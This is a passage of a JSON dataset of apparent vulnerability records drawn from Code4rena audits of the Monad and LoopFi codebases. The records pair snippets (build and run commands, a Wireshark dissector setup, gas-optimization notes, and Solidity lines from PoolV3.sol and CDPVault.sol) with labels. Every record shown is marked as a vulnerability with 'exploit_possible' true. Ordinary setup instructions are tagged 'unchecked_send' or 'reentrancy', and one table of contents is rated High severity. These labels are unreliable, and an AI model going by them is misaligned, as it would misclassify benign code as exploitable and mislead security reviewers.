    "description": "Both the event descriptor array and payload buffer are *ring buffers*: once all array slots have been used, subsequent writes wrap around to the beginning of the array. For event descriptors, the detection mechanism for slow consumers observing an overwrite relies on the sequence number, as described in the `event.md` documentation. For the payload buffer, a",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "CXX=/usr/bin/g++-15 CC=/usr/bin/gcc-15 ASMFLAGS=-march=haswell CFLAGS=\"-march=haswell\" CXXFLAGS=\"-march=haswell\" TRIEDB_TARGET=triedb_driver cargo run --bin monad-rpc -- --ipc-path docker/devnet/monad/mempool.sock --triedb-path <path_to_triedb_directory> --node_config <path_to_node_toml>",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "# monad-rpc",
    "description": "The prerequisite to starting the RPC server is to first [start a Monad consensus client](/monad-node/README.md) and connect the RPC server to it. Run the following in the repo root directory: 1. `export RUST_LOG=info` - The logging level can be adjusted as needed. 2. `CXX=/usr/bin/g++-15 CC=/usr/bin/gcc-15 ASMFLAGS=-march=haswell CFLAGS=\"-march=haswell\" CXXFLAGS=\"-march=haswell\" TRIEDB_TARGET=triedb_driver cargo run --bin monad-rpc -- --ipc-path docker/devnet/monad/mempool.sock --triedb-path <path_to_triedb_directory> --node_config <path_to_node_toml>`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.288,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "bash\ngo install github.com/google/pprof@latest\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Install pprof",
    "description": "go install github.com/google/pprof@latest Or follow guidelines from [pprof](https://github.com/google/pprof)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.047,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\nWhen collecting profile pprof will try to find binaries and static libs\nfor symbolization. If you built and running application in docker container,\ncopy them and point to the directory with ",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Collect profile",
    "description": "pprof -http=0.0.0.0:8080 http://0.0.0.0:32808/debug/pprof/heap When collecting profile pprof will try to find binaries and static libs for symbolization. If you built and running application in docker container, copy them and point to the directory with `export PPROF_BINARY_PATH=~/monad-binaries`.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.193,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "CXX=/usr/bin/g++-15 CC=/usr/bin/gcc-15 ASMFLAGS=-march=haswell CFLAGS=\"-march=haswell\" CXXFLAGS=\"-march=haswell\" TRIEDB_TARGET=triedb_driver cargo run --bin monad-node -- --secp-identity docker/devnet/monad/config/id-secp --bls-identity docker/devnet/monad/config/id-bls --node-config docker/devnet/monad/config/node.toml --forkpoint-config docker/devnet/monad/config/forkpoint.toml --wal-path docker/devnet/monad/wal --mempool-ipc-path docker/devnet/monad/mempool.sock --control-panel-ipc-path docker/devnet/monad/controlpanel.sock --ledger-path docker/devnet/monad/ledger --statesync-ipc-path docker/devnet/monad/statesync.sock --triedb-path <path_to_triedb>",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "# monad-node",
    "description": "Starting a Monad consensus node generates a blockdb directory, a ledger directory, a write ahead logging file, and an IPC socket: Run the following in the repo root directory: 1. `export RUST_LOG=info` - The logging level can be adjusted as needed. 2. `cp docker/devnet/monad/config/forkpoint.genesis.toml docker/devnet/monad/config/forkpoint.toml`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.66,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "<backend_type> <connection_params>",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Features",
    "description": "**Read from any backend, write to any backend** - `--block-data-source` allows passing different backend locators: \"aws testnet-ltu-032-0 50\", \"triedb /data/triedb 5000\", \"mongo ...\", etc. - `--archive-sink` similar to above, but only supports writable backends, aka no triedb - Backend locator strings follow the pattern: `<backend_type> <connection_params>`, parsed by the CLI module **Read and convert any previous schema version**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.034,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "block_archive_worker.rs",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "File Structure of Library and Binaries",
    "description": "The archive system is broken apart into a core library, `monad-archive`, and 3 scoped binaries: - `monad-archiver` - Reads from TrieDB or another archive, writes to durable storage - `monad-archive-checker` - Validates data consistency across archive replicas - `monad-indexer` - Builds transaction and log indexes from archived blocks",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ntshark -r raptorcast.pcap -V -T fields -E separator=/t \\\n        -e frame.time_relative \\\n        -e ip.src_host \\\n        -e ip.dst_host \\\n        -e udp.srcport \\\n        -e udp.dstport \\\n        -e raptorcast.author \\\n        -e raptorcast.broadcast \\\n        -e raptorcast.unix_ts_ms \\\n        -e raptorcast.delay_ms \\\n        -e raptorcast.app_message_hash \\\n        -e raptorcast.app_message_len \\\n        -e raptorcast.merkle_root \\\n        -e raptorcast.first_hop_recipient \\\n        -e raptorcast.merkle_leaf_index \\\n        -e raptorcast.encoding_symbol_id \\\n        -e raptorcast.encoded_symbol_len\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "This directory contains a Wireshark dissector for the RaptorCast protocol.",
    "description": "This dissector supports version 0 of the RaptorCast protocol, which is the current and latest version, and supports the following features: - Decoding and displaying of all protocol header fields, with foldable signature and Merkle proof sections. - Naive validity checking of protocol fields for which it is feasible.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 19,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.611,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nThen build the dissector (see below), and copy the `raptorcast.so` file\nto the wireshark plug-in directory in your home directory, as follows:\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "apt install tshark          # Ubuntu 25.04",
    "description": "Then build the dissector (see below), and copy the `raptorcast.so` file to the wireshark plug-in directory in your home directory, as follows:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.144,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " ubuntu:25.04 /bin/bash\napt update\nln -s /usr/share/zoneinfo/posix/UTC /etc/localtime\napt -y dist-upgrade\napt -y install build-essential cmake git libsecp256k1-dev wireshark-dev\n\ncd /tmp\ngit clone https://github.com/BLAKE3-team/BLAKE3/\ncd BLAKE3/c\nmkdir build\ncd build\ncmake -DBUILD_SHARED_LIBS=1 ..\nmake\nmake install\nln -s ../local/lib/libblake3.so /usr/lib64/libblake3.so\n\nln -s ../lib/x86_64-linux-gnu/libsecp256k1.so /usr/lib64/libsecp256k1.so\n\ncd $SRCDIR\nrm -rf build\nmkdir build\ncd build\ncmake ..\nmake\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Ubuntu 25.04",
    "description": "mkdir -p ~/.local/lib/wireshark/plugins/4.2/epan cp raptorcast.so ~/.local/lib/wireshark/plugins/4.2/epan/ Building the dissector for Fedora 41 ------------------------------------ To build the dissector for Fedora 41 in a Docker container, run the",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.508,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "docker run -p 8080:8080 --volume $(pwd)/docker/devnet/monad:/monad monad-rpc",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "# Devnet",
    "description": "To start a consensus client, run the following: 1. Run `bash docker/devnet/clean.sh` to clean all previously generated files 2. Run `docker build -t monad-node -f docker/devnet/Dockerfile .` to build the docker image for the node 3. Run `docker run -d --volume $(pwd)/docker/devnet/monad:/monad monad-node` to run the docker container To start a JsonRpc server, run the following (the consensus node must be first started):",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.076,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "array[index] = array[index] + amount",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "# Report",
    "description": "- [Report](#report) - [Gas Optimizations](#gas-optimizations) - [\\[GAS-1\\] Don't use `_msgSender()` if not supporting EIP-2771](#gas-1-dont-use-_msgsender-if-not-supporting-eip-2771) - [\\[GAS-2\\] `a = a + b` is more gas effective than `a += b` for state variables (excluding arrays and mappings)](#gas-2-a--a--b-is-more-gas-effective-than-a--b-for-state-variables-excluding-arrays-and-mappings) - [\\[GAS-3\\] Use assembly to check for `address(0)`](#gas-3-use-assembly-to-check-for-address0)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.036,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "array[index] = array[index] + amount",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Gas Optimizations",
    "description": "| |Issue|Instances| |-|:-|:-:| | [GAS-1](#GAS-1) | Don't use `_msgSender()` if not supporting EIP-2771 | 4 | | [GAS-2](#GAS-2) | `a = a + b` is more gas effective than `a += b` for state variables (excluding arrays and mappings) | 23 | | [GAS-3](#GAS-3) | Use assembly to check for `address(0)` | 50 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.036,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/CDPVault.sol\n\n476:         cdd.cumulativeQuotaInterest += position.cumulativeQuotaInterest;\n\n480:         cdd.accruedInterest += cdd.cumulativeQuotaInterest;\n\n670:                 profit += cumulativeQuotaInterest; // U:[CL-3]\n\n676:                 profit += amountToRepay; // U:[CL-3]\n\n695:                 profit += interestAccrued;\n\n700:                 profit += amountToRepay; // U:[CL-3]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"GAS-2\"></a>[GAS-2] `a = a + b` is more gas effective than `a += b` for state variables (excluding arrays and mappings)",
    "description": "This saves **16 gas per instance.** *Instances (23)*: File: src/CDPVault.sol 476:         cdd.cumulativeQuotaInterest += position.cumulativeQuotaInterest; 480:         cdd.accruedInterest += cdd.cumulativeQuotaInterest;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.414,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n142:     bool public persistRewardsPerSecond;\n\n161:     mapping(address => bool) private validRTokens;\n\n173:     mapping(address => bool) public eligibilityExempt;\n\n206:     mapping(address => bool) public authorizedContracts;\n\n209:     mapping(address => bool) public whitelist;\n\n211:     bool public whitelistActive;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"GAS-5\"></a>[GAS-5] Using bools for storage incurs overhead",
    "description": "Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from \u2018false\u2019 to \u2018true\u2019, after having been \u2018true\u2019 in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27). *Instances (18)*: File: src/PoolV3.sol 82:     bool public locked; 107:     mapping(address => bool) internal _allowed;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.376,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n323:                 _transferFrom(upFrontToken, collateralizer, self, upFrontAmount, permitParams);\n\n328:         IPermission(leverParams.vault).modifyPermission(leverParams.position, self, true);\n\n330:             IERC3156FlashBorrower(self),\n\n331:             address(underlyingToken),\n\n335:         IPermission(leverParams.vault).modifyPermission(leverParams.position, self, false);\n\n366:             ICreditFlashBorrower(self),\n\n370:         IPermission(leverParams.vault).modifyPermission(leverParams.position, self, false);\n\n404:             address(swapAction),\n\n424:         underlyingToken.forceApprove(address(flashlender), addDebt);\n\n477:                     address(swapAction),\n\n489:         underlyingToken.forceApprove(address(flashlender), subDebt);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"GAS-7\"></a>[GAS-7] State variables should be cached in stack variables rather than re-reading them from storage",
    "description": "The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (100 gas) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses. *Saves 100 gas per instance* *Instances (32)*: File: src/CDPVault.sol 441:             uint256 amount = wmul(abs(deltaCollateral), tokenScale);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 26,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.813,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n7: import {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n9: import {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n10: import {IERC4626} from \"@openzeppelin/contracts/interfaces/IERC4626.sol\";\n\n11: import {IERC20Metadata} from \"@openzeppelin/contracts/interfaces/IERC20Metadata.sol\";\n\n12: import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n13: import {ERC4626} from \"@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol\";\n\n14: import {ERC20Permit} from \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol\";\n\n16: import {Math} from \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n17: import {SafeCast} from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n18: import {EnumerableSet} from \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\n\n21: import {IAddressProviderV3, AP_TREASURY, NO_VERSION_CONTROL} from \"@gearbox-protocol/core-v3/contracts/interfaces/IAddressProviderV3.sol\";\n\n22: import {ICreditManagerV3} from \"@gearbox-protocol/core-v3/contracts/interfaces/ICreditManagerV3.sol\";\n\n23: import {ILinearInterestRateModelV3} from \"@gearbox-protocol/core-v3/contracts/interfaces/ILinearInterestRateModelV3.sol\";\n\n24: import {IPoolQuotaKeeperV3} from \"@gearbox-protocol/core-v3/contracts/interfaces/IPoolQuotaKeeperV3.sol\";\n\n25: import {IPoolV3} from \"@gearbox-protocol/core-v3/contracts/interfaces/IPoolV3.sol\";\n\n28: import {CreditLogic} from \"@gearbox-protocol/core-v3/contracts/libraries/CreditLogic.sol\";\n\n29: import {ACLNonReentrantTrait} from \"@gearbox-protocol/core-v3/contracts/traits/ACLNonReentrantTrait.sol\";\n\n30: import {ContractsRegisterTrait} from \"@gearbox-protocol/core-v3/contracts/traits/ContractsRegisterTrait.sol\";\n\n33: import {RAY, MAX_WITHDRAW_FEE, SECONDS_PER_YEAR, PERCENTAGE_FACTOR} from \"@gearbox-protocol/core-v2/contracts/libraries/Constants.sol\";\n\n35: import {ICDM} from \"./interfaces/ICDM.sol\";\n\n38: import \"@gearbox-protocol/core-v3/contracts/interfaces/IExceptions.sol\";\n\n131:         if (msg.sender != poolQuotaKeeper) revert CallerNotPoolQuotaKeeperException(); // U:[LP-2C]\n\n137:             revert CallerNotCreditManagerException(); // U:[PQK-4]\n\n142:         if (locked) revert PoolV3LockedException(); // U:[LP-2C]\n\n160:         ACLNonReentrantTrait(addressProvider_) // U:[LP-1A]\n\n162:         ERC4626(IERC20(underlyingToken_)) // U:[LP-1B]\n\n163:         ERC20(name_, symbol_) // U:[LP-1B]\n\n164:         ERC20Permit(name_) // U:[LP-1B]\n\n165:         nonZeroAddress(underlyingToken_) // U:[LP-1A]\n\n166:         nonZeroAddress(interestRateModel_) // U:[LP-1A]\n\n168:         addressProvider = addressProvider_; // U:[LP-1B]\n\n169:         underlyingToken = underlyingToken_; // U:[LP-1B]\n\n174:         }); // U:[LP-1B]\n\n176:         lastBaseInterestUpdate = uint40(block.timestamp); // U:[LP-1B]\n\n177:         _baseInterestIndexLU = uint128(RAY); // U:[LP-1B]\n\n179:         interestRateModel = interestRateModel_; // U:[LP-1B]\n\n180:         emit SetInterestRateModel(interestRateModel_); // U:[LP-1B]\n\n188:         _setTotalDebtLimit(totalDebtLimit_); // U:[LP-1B]\n\n203:         return IERC20(underlyingToken).balanceOf(address(this)); // U:[LP-3]\n\n209:         return _expectedLiquidityLU + _calcBaseInterestAccrued() + _calcQuotaRevenueAccrued(); // U:[LP-4]\n\n237:         whenNotPaused // U:[LP-2A]\n\n238:         nonReentrant // U:[LP-2B]\n\n239:         nonZeroAddress(receiver) // U:[LP-5]\n\n242:         uint256 assetsReceived = _amountMinusFee(assets); // U:[LP-6]\n\n243:         shares = _convertToShares(assetsReceived); // U:[LP-6]\n\n244:         _deposit(receiver, assets, assetsReceived, shares); // U:[LP-6]\n\n253:         shares = deposit(assets, receiver); // U:[LP-2A,2B,5,6]\n\n254:         emit Refer(receiver, referralCode, assets); // U:[LP-6]\n\n267:         whenNotPaused // U:[LP-2A]\n\n268:         nonReentrant // U:[LP-2B]\n\n269:         nonZeroAddress(receiver) // U:[LP-5]\n\n272:         uint256 assetsReceived = _convertToAssets(shares); // U:[LP-7]\n\n273:         assets = _amountWithFee(assetsReceived); // U:[LP-7]\n\n274:         _deposit(receiver, assets, assetsReceived, shares); // U:[LP-7]\n\n283:         assets = mint(shares, receiver); // U:[LP-2A,2B,5,7]\n\n284:         emit Refer(receiver, referralCode, assets); // U:[LP-7]\n\n299:         whenNotPaused // U:[LP-2A]\n\n301:         nonReentrant // U:[LP-2B]\n\n302:         nonZeroAddress(receiver) // U:[LP-5]\n\n306:         uint256 assetsSent = _amountWithWithdrawalFee(assetsToUser); // U:[LP-8]\n\n307:         shares = _convertToShares(assetsSent); // U:[LP-8]\n\n308:         _withdraw(receiver, owner, assetsSent, assets, assetsToUser, shares); // U:[LP-8]\n\n323:         whenNotPaused // U:[LP-2A]\n\n325:         nonReentrant // U:[LP-2B]\n\n326:         nonZeroAddress(receiver) // U:[LP-5]\n\n329:         uint256 assetsSent = _convertToAssets(shares); // U:[LP-9]\n\n331:         assets = _amountMinusFee(assetsToUser); // U:[LP-9]\n\n332:         _withdraw(receiver, owner, assetsSent, assets, assetsToUser, shares); // U:[LP-9]\n\n337:         shares = _convertToShares(_amountMinusFee(assets)); // U:[LP-10]\n\n342:         return _amountWithFee(_convertToAssets(shares)); // U:[LP-10]\n\n347:         return _convertToShares(_amountWithWithdrawalFee(_amountWithFee(assets))); // U:[LP-10]\n\n352:         return _amountMinusFee(_amountMinusWithdrawalFee(_convertToAssets(shares))); // U:[LP-10]\n\n357:         return paused() ? 0 : type(uint256).max; // U:[LP-11]\n\n362:         return paused() ? 0 : type(uint256).max; // U:[LP-11]\n\n372:                 ); // U:[LP-11]\n\n377:         return paused() ? 0 : Math.min(balanceOf(owner), _convertToShares(availableLiquidity())); // U:[LP-11]\n\n385:         IERC20(underlyingToken).safeTransferFrom({from: msg.sender, to: address(this), value: assetsSent}); // U:[LP-6,7]\n\n391:         }); // U:[LP-6,7]\n\n393:         _mint(receiver, shares); // U:[LP-6,7]\n\n394:         emit Deposit(msg.sender, receiver, assetsSent, shares); // U:[LP-6,7]\n\n409:         if (msg.sender != owner) _spendAllowance({owner: owner, spender: msg.sender, amount: shares}); // U:[LP-8,9]\n\n410:         _burn(owner, shares); // U:[LP-8,9]\n\n413:             expectedLiquidityDelta: -assetsSent.toInt256(),\n\n414:             availableLiquidityDelta: -assetsSent.toInt256(),\n\n416:         }); // U:[LP-8,9]\n\n418:         IERC20(underlyingToken).safeTransfer({to: receiver, value: amountToUser}); // U:[LP-8,9]\n\n421:                 IERC20(underlyingToken).safeTransfer({to: treasury, value: assetsSent - amountToUser}); // U:[LP-8,9]\n\n424:         emit Withdraw(msg.sender, receiver, owner, assetsReceived, shares); // U:[LP-8,9]\n\n431:         return assets; //(assets == 0 || supply == 0) ? assets : assets.mulDiv(supply, totalAssets(), rounding);\n\n438:         return shares; //(supply == 0) ? shares : shares.mulDiv(totalAssets(), supply, rounding);\n\n467:         borrowable = _borrowable(_totalDebt); // U:[LP-12]\n\n468:         if (borrowable == 0) return 0; // U:[LP-12]\n\n470:         borrowable = Math.min(borrowable, _borrowable(_creditManagerDebt[creditManager])); // U:[LP-12]\n\n471:         if (borrowable == 0) return 0; // U:[LP-12]\n\n476:         }); // U:[LP-12]\n\n478:         borrowable = Math.min(borrowable, available); // U:[LP-12]\n\n490:         creditManagerOnly // U:[LP-2C]\n\n491:         whenNotPaused // U:[LP-2A]\n\n492:         nonReentrant // U:[LP-2B]\n\n497:         uint128 totalBorrowed_ = _totalDebt.borrowed + borrowedAmountU128;\n\n498:         uint128 cmBorrowed_ = cmDebt.borrowed + borrowedAmountU128;\n\n500:             revert CreditManagerCantBorrowException(); // U:[LP-2C,13A]\n\n505:             availableLiquidityDelta: -borrowedAmount.toInt256(),\n\n507:         }); // U:[LP-13B]\n\n509:         cmDebt.borrowed = cmBorrowed_; // U:[LP-13B]\n\n510:         _totalDebt.borrowed = totalBorrowed_; // U:[LP-13B]\n\n512:         IERC20(underlyingToken).safeTransfer({to: creditAccount, value: borrowedAmount}); // U:[LP-13B]\n\n513:         emit Borrow(msg.sender, creditAccount, borrowedAmount); // U:[LP-13B]\n\n536:         creditManagerOnly // U:[LP-2C]\n\n537:         whenNotPaused // U:[LP-2A]\n\n538:         nonReentrant // U:[LP-2B]\n\n545:             revert CallerNotCreditManagerException(); // U:[LP-2C,14A]\n\n549:             _mint(treasury, convertToShares(profit)); // U:[LP-14B]\n\n558:                         loss: convertToAssets(sharesToBurn - sharesInTreasury)\n\n559:                     }); // U:[LP-14D]\n\n563:             _burn(treasury_, sharesToBurn); // U:[LP-14C,14D]\n\n567:             expectedLiquidityDelta: -loss.toInt256(),\n\n570:         }); // U:[LP-14B,14C,14D]\n\n572:         _totalDebt.borrowed -= repaidAmountU128; // U:[LP-14B,14C,14D]\n\n573:         cmDebt.borrowed = cmBorrowed - repaidAmountU128; // U:[LP-14B,14C,14D]\n\n575:         emit Repay(msg.sender, repaidAmount, profit, loss); // U:[LP-14B,14C,14D]\n\n587:             return limit - borrowed;\n\n608:             ((baseInterestRate_ * _totalDebt.borrowed) * (PERCENTAGE_FACTOR - withdrawFee)) /\n\n609:             PERCENTAGE_FACTOR /\n\n610:             assets; // U:[LP-15]\n\n616:         if (block.timestamp == timestampLU) return _baseInterestIndexLU; // U:[LP-16]\n\n617:         return _calcBaseInterestIndex(timestampLU); // U:[LP-16]\n\n628:         if (block.timestamp == timestampLU) return 0; // U:[LP-17]\n\n629:         return _calcBaseInterestAccrued(timestampLU); // U:[LP-17]\n\n647:         uint256 expectedLiquidity_ = (expectedLiquidity().toInt256() + expectedLiquidityDelta).toUint256();\n\n648:         uint256 availableLiquidity_ = (availableLiquidity().toInt256() + availableLiquidityDelta).toUint256();\n\n652:             _baseInterestIndexLU = _calcBaseInterestIndex(lastBaseInterestUpdate_).toUint128(); // U:[LP-18]\n\n657:             lastQuotaRevenueUpdate = uint40(block.timestamp); // U:[LP-18]\n\n660:         _expectedLiquidityLU = expectedLiquidity_.toUint128(); // U:[LP-18]\n\n667:             .toUint128(); // U:[LP-18]\n\n672:         return (_totalDebt.borrowed * baseInterestRate().calcLinearGrowth(timestamp)) / RAY;\n\n677:         return (_baseInterestIndexLU * (RAY + baseInterestRate().calcLinearGrowth(timestamp))) / RAY;\n\n696:         nonReentrant // U:[LP-2B]\n\n700:         _setQuotaRevenue(uint256(quotaRevenue().toInt256() + quotaRevenueDelta)); // U:[LP-19]\n\n710:         nonReentrant // U:[LP-2B]\n\n711:         poolQuotaKeeperOnly // U:[LP-2C]\n\n713:         _setQuotaRevenue(newQuotaRevenue); // U:[LP-20]\n\n719:         if (block.timestamp == timestampLU) return 0; // U:[LP-21]\n\n720:         return _calcQuotaRevenueAccrued(timestampLU); // U:[LP-21]\n\n729:             _expectedLiquidityLU += _calcQuotaRevenueAccrued(timestampLU).toUint128(); // U:[LP-20]\n\n730:             lastQuotaRevenueUpdate = uint40(block.timestamp); // U:[LP-20]\n\n732:         _quotaRevenue = newQuotaRevenue.toUint96(); // U:[LP-20]\n\n751:         configuratorOnly // U:[LP-2C]\n\n752:         nonZeroAddress(newInterestRateModel) // U:[LP-22A]\n\n754:         interestRateModel = newInterestRateModel; // U:[LP-22B]\n\n755:         _updateBaseInterest(0, 0, false); // U:[LP-22B]\n\n756:         emit SetInterestRateModel(newInterestRateModel); // U:[LP-22B]\n\n766:         configuratorOnly // U:[LP-2C]\n\n767:         nonZeroAddress(newPoolQuotaKeeper) // U:[LP-23A]\n\n770:             revert IncompatiblePoolQuotaKeeperException(); // U:[LP-23C]\n\n773:         poolQuotaKeeper = newPoolQuotaKeeper; // U:[LP-23D]\n\n776:         _setQuotaRevenue(newQuotaRevenue); // U:[LP-23D]\n\n778:         emit SetPoolQuotaKeeper(newPoolQuotaKeeper); // U:[LP-23D]\n\n788:         controllerOnly // U:[LP-2C]\n\n790:         _setTotalDebtLimit(newLimit); // U:[LP-24]\n\n803:         controllerOnly // U:[LP-2C]\n\n804:         nonZeroAddress(creditManager) // U:[LP-25A]\n\n808:                 revert IncompatibleCreditManagerException(); // U:[LP-25C]\n\n810:             _creditManagerSet.add(creditManager); // U:[LP-25D]\n\n811:             